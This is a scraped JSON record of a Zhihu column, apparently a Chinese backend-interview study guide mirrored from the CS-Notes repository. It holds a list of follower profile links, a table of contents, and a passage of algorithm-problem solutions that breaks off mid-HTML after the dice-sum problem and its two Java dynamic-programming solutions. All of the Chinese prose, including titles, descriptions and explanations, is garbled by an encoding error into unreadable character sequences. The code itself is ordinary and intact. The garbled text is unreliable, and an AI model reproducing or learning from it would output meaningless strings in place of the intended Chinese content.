{
    "title": "åç«¯é¢è¯•è¿›é˜¶æŒ‡å—", 
    "description": "ä¸»è¦é¢å‘ Javaã€C++ã€Python ç­‰åç«¯ç ”å‘å²—ä½ï¼Œä»¥åŠ å¤§æ•°æ®ã€ç§»åŠ¨å¼€å‘ã€æµ‹å¼€ ç­‰å’Œåç«¯ç ”å‘ç±»ä¼¼å²—ä½çš„åŒå­¦ã€‚åŒæ­¥äº https://github.com/CyC2018/CS-Notes", 
    "followers": [
        "https://www.zhihu.com/people/ke-yi-94-89-63", 
        "https://www.zhihu.com/people/chen-gao-shuang", 
        "https://www.zhihu.com/people/john-80-55", 
        "https://www.zhihu.com/people/amoresj", 
        "https://www.zhihu.com/people/zhang-yu-71-29-7", 
        "https://www.zhihu.com/people/yang-long-herman", 
        "https://www.zhihu.com/people/tou-wong-64", 
        "https://www.zhihu.com/people/yang-xi-wen-10", 
        "https://www.zhihu.com/people/yishi-qing-yuan-71", 
        "https://www.zhihu.com/people/tang-mao-lin-50", 
        "https://www.zhihu.com/people/a-ha-er", 
        "https://www.zhihu.com/people/aeternity", 
        "https://www.zhihu.com/people/DiXinkai", 
        "https://www.zhihu.com/people/juneherren", 
        "https://www.zhihu.com/people/wang-xuan-ju", 
        "https://www.zhihu.com/people/yuan-fang-91-30", 
        "https://www.zhihu.com/people/uuu-59-37", 
        "https://www.zhihu.com/people/ChangingFond", 
        "https://www.zhihu.com/people/zhe-yang-de-wo-8", 
        "https://www.zhihu.com/people/tian-tian-tian-lan-72-5", 
        "https://www.zhihu.com/people/liu-xiao-sheng-27", 
        "https://www.zhihu.com/people/ze-xchong", 
        "https://www.zhihu.com/people/gavin_alison", 
        "https://www.zhihu.com/people/liang-de-tai-yang", 
        "https://www.zhihu.com/people/li-xin-84-96-66", 
        "https://www.zhihu.com/people/chou-miao-miao-10", 
        "https://www.zhihu.com/people/roy-76-41-65", 
        "https://www.zhihu.com/people/dellt3500", 
        "https://www.zhihu.com/people/shao-lin-xiao-zi-24", 
        "https://www.zhihu.com/people/ai-zhi-wen-99", 
        "https://www.zhihu.com/people/shao-guo-liang", 
        "https://www.zhihu.com/people/fang-he-yi", 
        "https://www.zhihu.com/people/wolfwar", 
        "https://www.zhihu.com/people/linphy", 
        "https://www.zhihu.com/people/yanni-87", 
        "https://www.zhihu.com/people/guo-ming-zhou-89", 
        "https://www.zhihu.com/people/ichenxing-88", 
        "https://www.zhihu.com/people/zhu-christmas-81", 
        "https://www.zhihu.com/people/CodeInception", 
        "https://www.zhihu.com/people/jian-dan-jiu-hao-25-84", 
        "https://www.zhihu.com/people/da-xia-86-95", 
        "https://www.zhihu.com/people/mu-rong-chuan-38", 
        "https://www.zhihu.com/people/Zou.yu", 
        "https://www.zhihu.com/people/god-thanra", 
        "https://www.zhihu.com/people/Ashitaka_L", 
        "https://www.zhihu.com/people/kan-chang-fa-77", 
        "https://www.zhihu.com/people/reader2018", 
        "https://www.zhihu.com/people/reed-84-49", 
        "https://www.zhihu.com/people/mo-shang-hua-kai-78-20-72", 
        "https://www.zhihu.com/people/zwl-41", 
        "https://www.zhihu.com/people/sheng-zhu-77", 
        "https://www.zhihu.com/people/tao-wu-sheng", 
        "https://www.zhihu.com/people/huitoushian", 
        "https://www.zhihu.com/people/bu-ding-long", 
        "https://www.zhihu.com/people/xiao-hua-69-57-6", 
        "https://www.zhihu.com/people/whiteyork", 
        "https://www.zhihu.com/people/bu-xiang-qiao-dai-ma-de-cheng-xu-yuan-76", 
        "https://www.zhihu.com/people/xiao-qian-52-32", 
        "https://www.zhihu.com/people/wu-jing-yi-65-96", 
        "https://www.zhihu.com/people/zhou-zhi-gang-28", 
        "https://www.zhihu.com/people/ai-ke-78", 
        "https://www.zhihu.com/people/wang-ming-hao-7", 
        "https://www.zhihu.com/people/ye-ling-ye-83", 
        "https://www.zhihu.com/people/lazy-c", 
        "https://www.zhihu.com/people/di-jing-85", 
        "https://www.zhihu.com/people/lin-dong-jiang-zhi-5-81", 
        "https://www.zhihu.com/people/dong-bin-75", 
        "https://www.zhihu.com/people/hewenning", 
        "https://www.zhihu.com/people/xiao-bing-ling-54", 
        "https://www.zhihu.com/people/lu-zai-jiao-xia-36", 
        "https://www.zhihu.com/people/hu-wei-16-4", 
        "https://www.zhihu.com/people/root-22-59", 
        "https://www.zhihu.com/people/willvi-79", 
        "https://www.zhihu.com/people/zi-lu-2-53", 
        "https://www.zhihu.com/people/ienterprise", 
        "https://www.zhihu.com/people/beauty-58-30", 
        "https://www.zhihu.com/people/jeson-47", 
        "https://www.zhihu.com/people/gle-goo-42"
    ], 
    "article": [
        {
            "url": "https://zhuanlan.zhihu.com/p/69358772", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "åç«¯é¢è¯•è¿›é˜¶æŒ‡å— ç›®å½• ğŸ“š", 
            "content": "<p>æœ¬ä¸“æ åŒæ­¥äºä¸ªäººåšå®¢ï¼š<a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">CyC2018/CS-Notes</a>ï¼Œè¯¥åšå®¢å·²æœ‰ 66k Starï¼Œåœ¨ Github ä¸Šæ’äºŒååå·¦å³ï¼š<a href=\"https://link.zhihu.com/?target=https%3A//gitstar-ranking.com/repositories\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">gitstar-ranking</a>ã€‚</p><h2>ğŸ’¯ é¢è¯•ç›¸å…³</h2><ul><li><a href=\"https://zhuanlan.zhihu.com/p/56655579\" class=\"internal\">ä»æ˜¥æ‹›æƒ¨è´¥åˆ°ç§‹æ‹›æ”¶è· BAT OFFER</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/56655484\" class=\"internal\">ä¸€æ–‡å¸®ä½ ç†æ¸…é¢è¯•çŸ¥è¯†ç‚¹</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/56655602\" class=\"internal\">å†™å¥½æŠ€æœ¯ç®€å†</a></li></ul><h2>âœï¸ ç®—æ³•</h2><ul><li><a href=\"https://zhuanlan.zhihu.com/p/69346234\" class=\"internal\">å‰‘æŒ‡ Offer é¢˜è§£</a></li></ul><h2>ğŸ’» æ“ä½œç³»ç»Ÿ</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/%25E8%25AE%25A1%25E7%25AE%2597%25E6%259C%25BA%25E6%2593%258D%25E4%25BD%259C%25E7%25B3%25BB%25E7%25BB%259F%2520-%2520%25E7%259B%25AE%25E5%25BD%2595.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">è®¡ç®—æœºæ“ä½œç³»ç»Ÿ</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/Linux.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Linux</a></li></ul><h2>â˜ï¸ ç½‘ç»œ</h2><ul><li><a href=\"https://zhuanlan.zhihu.com/p/68764284\" class=\"internal\">è®¡ç®—æœºç½‘ç»œ</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764595\" class=\"internal\">HTTP</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68529777\" class=\"internal\">Socket</a></li></ul><h2>ğŸ¨ é¢å‘å¯¹è±¡</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/%25E8%25AE%25BE%25E8%25AE%25A1%25E6%25A8%25A1%25E5%25BC%258F.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">è®¾è®¡æ¨¡å¼</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/%25E9%259D%25A2%25E5%2590%2591%25E5%25AF%25B9%25E8%25B1%25A1%25E6%2580%259D%25E6%2583%25B3.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">é¢å‘å¯¹è±¡æ€æƒ³</a></li></ul><h2>ğŸ’¾ æ•°æ®åº“</h2><ul><li><a href=\"https://zhuanlan.zhihu.com/p/68500259\" class=\"internal\">æ•°æ®åº“ç³»ç»ŸåŸç†</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68500444\" class=\"internal\">SQL</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68500647\" class=\"internal\">Leetcode-Database é¢˜è§£</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68500693\" class=\"internal\">MySQL</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/Redis.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Redis</a></li></ul><h2>â˜•ï¸ Java</h2><ul><li><a href=\"https://zhuanlan.zhihu.com/p/68499453\" class=\"internal\">Java åŸºç¡€</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/59850978\" class=\"internal\">Java å®¹å™¨</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/59850678\" class=\"internal\">Java å¹¶å‘</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68499946\" class=\"internal\">Java è™šæ‹Ÿæœº</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68500017\" class=\"internal\">Java I/O</a></li></ul><h2>ğŸ’¡ ç³»ç»Ÿè®¾è®¡</h2><ul><li><a href=\"https://zhuanlan.zhihu.com/p/68500774\" class=\"internal\">ç³»ç»Ÿè®¾è®¡åŸºç¡€</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68500828\" class=\"internal\">åˆ†å¸ƒå¼</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68528961\" class=\"internal\">é›†ç¾¤</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68529177\" class=\"internal\">æ”»å‡»æŠ€æœ¯</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68529269\" class=\"internal\">ç¼“å­˜</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68529374\" class=\"internal\">æ¶ˆæ¯é˜Ÿåˆ—</a></li></ul><h2>ğŸ”§ å·¥å…·</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/Git.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Git</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/Docker.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Docker</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/%25E6%259E%2584%25E5%25BB%25BA%25E5%25B7%25A5%25E5%2585%25B7.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ„å»ºå·¥å…·</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/CS-Notes/blob/master/notes/%25E6%25AD%25A3%25E5%2588%2599%25E8%25A1%25A8%25E8%25BE%25BE%25E5%25BC%258F.md\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ­£åˆ™è¡¨è¾¾å¼</a></li></ul>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/69346234", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£", 
            "content": "<p></p><ul><li><a href=\"https://zhuanlan.zhihu.com/p/68764745\" class=\"internal\">3-9</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764845\" class=\"internal\">10-19</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764926\" class=\"internal\">20-29</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/68764988\" class=\"internal\">30-39</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345978\" class=\"internal\">40-49</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69345998\" class=\"internal\">50-59</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022\" class=\"internal\">60-68</a></li></ul><p></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }, 
                {
                    "tag": "ç®—æ³•", 
                    "tagLink": "https://api.zhihu.com/topics/19553510"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/69346022", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "å‰‘æŒ‡ Offer é¢˜è§£ 60-68", 
            "content": "<ul><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#60-n-%E4%B8%AA%E9%AA%B0%E5%AD%90%E7%9A%84%E7%82%B9%E6%95%B0\" class=\"internal\">60. n ä¸ªéª°å­çš„ç‚¹æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#61-%E6%89%91%E5%85%8B%E7%89%8C%E9%A1%BA%E5%AD%90\" class=\"internal\">61. æ‰‘å…‹ç‰Œé¡ºå­</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#62-%E5%9C%86%E5%9C%88%E4%B8%AD%E6%9C%80%E5%90%8E%E5%89%A9%E4%B8%8B%E7%9A%84%E6%95%B0\" class=\"internal\">62. åœ†åœˆä¸­æœ€åå‰©ä¸‹çš„æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#63-%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6\" class=\"internal\">63. è‚¡ç¥¨çš„æœ€å¤§åˆ©æ¶¦</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#64-%E6%B1%82-123n\" class=\"internal\">64. æ±‚ 1+2+3+...+n</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#65-%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95\" class=\"internal\">65. ä¸ç”¨åŠ å‡ä¹˜é™¤åšåŠ æ³•</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#66-%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84\" class=\"internal\">66. æ„å»ºä¹˜ç§¯æ•°ç»„</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#67-%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%88%90%E6%95%B4%E6%95%B0\" class=\"internal\">67. æŠŠå­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°</a></li><li><a href=\"https://zhuanlan.zhihu.com/p/69346022/edit#68-%E6%A0%91%E4%B8%AD%E4%B8%A4%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E6%9C%80%E4%BD%8E%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88\" class=\"internal\">68. æ ‘ä¸­ä¸¤ä¸ªèŠ‚ç‚¹çš„æœ€ä½å…¬å…±ç¥–å…ˆ</a> </li></ul><h2>60. n ä¸ªéª°å­çš„ç‚¹æ•°</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.lintcode.com/en/problem/dices-sum/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Lintcode</a></p><h2>é¢˜ç›®æè¿°</h2><p>æŠŠ n ä¸ªéª°å­ä»åœ¨åœ°ä¸Šï¼Œæ±‚ç‚¹æ•°å’Œä¸º s çš„æ¦‚ç‡ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-48b04f57e153733b4f1430bafc7d86e4_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"491\" data-rawheight=\"132\" class=\"origin_image zh-lightbox-thumb\" width=\"491\" data-original=\"https://pic1.zhimg.com/v2-48b04f57e153733b4f1430bafc7d86e4_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;491&#39; height=&#39;132&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"491\" data-rawheight=\"132\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"491\" data-original=\"https://pic1.zhimg.com/v2-48b04f57e153733b4f1430bafc7d86e4_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-48b04f57e153733b4f1430bafc7d86e4_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><h3>åŠ¨æ€è§„åˆ’</h3><p>ä½¿ç”¨ä¸€ä¸ªäºŒç»´æ•°ç»„ dp å­˜å‚¨ç‚¹æ•°å‡ºç°çš„æ¬¡æ•°ï¼Œå…¶ä¸­ dp[i][j] è¡¨ç¤ºå‰ i ä¸ªéª°å­äº§ç”Ÿç‚¹æ•° j çš„æ¬¡æ•°ã€‚</p><p>ç©ºé—´å¤æ‚åº¦ï¼šO(N2)</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">,</span> <span class=\"n\">Double</span><span class=\"o\">&gt;&gt;</span> <span class=\"nf\">dicesSum</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">face</span> <span class=\"o\">=</span> <span class=\"n\">6</span><span class=\"o\">;</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">pointNum</span> <span class=\"o\">=</span> <span class=\"n\">face</span> <span class=\"o\">*</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"kt\">long</span><span class=\"o\">[][]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">long</span><span class=\"o\">[</span><span class=\"n\">n</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">][</span><span class=\"n\">pointNum</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">face</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">1</span><span class=\"o\">][</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;=</span> <span class=\"n\">pointNum</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>     <span class=\"cm\">/* ä½¿ç”¨ i ä¸ªéª°å­æœ€å°ç‚¹æ•°ä¸º i */</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"n\">face</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"n\">j</span><span class=\"o\">;</span> <span class=\"n\">k</span><span class=\"o\">++)</span>\n                <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">+=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">i</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">][</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">k</span><span class=\"o\">];</span>\n\n    <span class=\"kd\">final</span> <span class=\"kt\">double</span> <span class=\"n\">totalNum</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">pow</span><span class=\"o\">(</span><span class=\"n\">6</span><span class=\"o\">,</span> <span class=\"n\">n</span><span class=\"o\">);</span>\n    <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">,</span> <span class=\"n\">Double</span><span class=\"o\">&gt;&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">pointNum</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">AbstractMap</span><span class=\"o\">.</span><span class=\"na\">SimpleEntry</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">n</span><span class=\"o\">][</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">/</span> <span class=\"n\">totalNum</span><span class=\"o\">));</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>åŠ¨æ€è§„åˆ’ + æ—‹è½¬æ•°ç»„</h3><p>ç©ºé—´å¤æ‚åº¦ï¼šO(N)</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">,</span> <span class=\"n\">Double</span><span class=\"o\">&gt;&gt;</span> <span class=\"nf\">dicesSum</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">n</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">face</span> <span class=\"o\">=</span> <span class=\"n\">6</span><span class=\"o\">;</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">pointNum</span> <span class=\"o\">=</span> <span class=\"n\">face</span> <span class=\"o\">*</span> <span class=\"n\">n</span><span class=\"o\">;</span>\n    <span class=\"kt\">long</span><span class=\"o\">[][]</span> <span class=\"n\">dp</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">long</span><span class=\"o\">[</span><span class=\"n\">2</span><span class=\"o\">][</span><span class=\"n\">pointNum</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">];</span>\n\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">face</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">0</span><span class=\"o\">][</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n\n    <span class=\"kt\">int</span> <span class=\"n\">flag</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>                                     <span class=\"cm\">/* æ—‹è½¬æ ‡è®° */</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">2</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++,</span> <span class=\"n\">flag</span> <span class=\"o\">=</span> <span class=\"n\">1</span> <span class=\"o\">-</span> <span class=\"n\">flag</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;=</span> <span class=\"n\">pointNum</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>\n            <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">flag</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>                          <span class=\"cm\">/* æ—‹è½¬æ•°ç»„æ¸…é›¶ */</span>\n\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;=</span> <span class=\"n\">pointNum</span><span class=\"o\">;</span> <span class=\"n\">j</span><span class=\"o\">++)</span>\n            <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span> <span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"n\">face</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">k</span> <span class=\"o\">&lt;=</span> <span class=\"n\">j</span><span class=\"o\">;</span> <span class=\"n\">k</span><span class=\"o\">++)</span>\n                <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">flag</span><span class=\"o\">][</span><span class=\"n\">j</span><span class=\"o\">]</span> <span class=\"o\">+=</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">1</span> <span class=\"o\">-</span> <span class=\"n\">flag</span><span class=\"o\">][</span><span class=\"n\">j</span> <span class=\"o\">-</span> <span class=\"n\">k</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">final</span> <span class=\"kt\">double</span> <span class=\"n\">totalNum</span> <span class=\"o\">=</span> <span class=\"n\">Math</span><span class=\"o\">.</span><span class=\"na\">pow</span><span class=\"o\">(</span><span class=\"n\">6</span><span class=\"o\">,</span> <span class=\"n\">n</span><span class=\"o\">);</span>\n    <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">Map</span><span class=\"o\">.</span><span class=\"na\">Entry</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">,</span> <span class=\"n\">Double</span><span class=\"o\">&gt;&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">n</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;=</span> <span class=\"n\">pointNum</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">AbstractMap</span><span class=\"o\">.</span><span class=\"na\">SimpleEntry</span><span class=\"o\">&lt;&gt;(</span><span class=\"n\">i</span><span class=\"o\">,</span> <span class=\"n\">dp</span><span class=\"o\">[</span><span class=\"n\">1</span> <span class=\"o\">-</span> <span class=\"n\">flag</span><span class=\"o\">][</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">/</span> <span class=\"n\">totalNum</span><span class=\"o\">));</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>61. æ‰‘å…‹ç‰Œé¡ºå­</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/762836f4d43d43ca9deb273b3de8e1f4%3FtpId%3D13%26tqId%3D11198%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" 